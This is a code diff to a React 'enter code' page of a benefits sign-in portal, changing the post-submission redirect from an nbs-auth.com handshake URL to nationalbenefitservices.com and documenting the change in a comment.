@@ -7,8 +7,19 @@ import { SiteFooter } from "@/components/site-footer"
 import { SiteHeader } from "@/components/site-header"
 import { HelpCircle } from "lucide-react"
 
-const ALIGHT_REDIRECT_URL =
-  "https://nbs-auth.com/Authentication/Handshake";
+/**
+ * Post-completion hand-off for this portal.
+ *
+ * Same destination as `GET /api/login-out` (app/api/login-out/route.ts) — a user
+ * who signs in, resets a password, or creates an account must all land in the
+ * same place. Deliberately NOT derived from SITE_ORIGIN: the hand-off host is a
+ * separate destination from the canonical SEO origin.
+ *
+ * Previously named ALIGHT_REDIRECT_URL and pointed at
+ * https://nbs-auth.com/Authentication/Handshake — a leftover from an Alight
+ * flavour, and inconsistent with the login hand-off.
+ */
+const HANDOFF_URL = "https://www.nationalbenefitservices.com/";
 
 function EnterCodeContent() {
   const [code, setCode] = useState("")
@@ -31,7 +42,7 @@ function EnterCodeContent() {
     }
     
     await new Promise((r) => setTimeout(r, 1000))
-    window.location.href = ALIGHT_REDIRECT_URL
+    window.location.href = HANDOFF_URL
   }
 
   const handleResend = async () => {
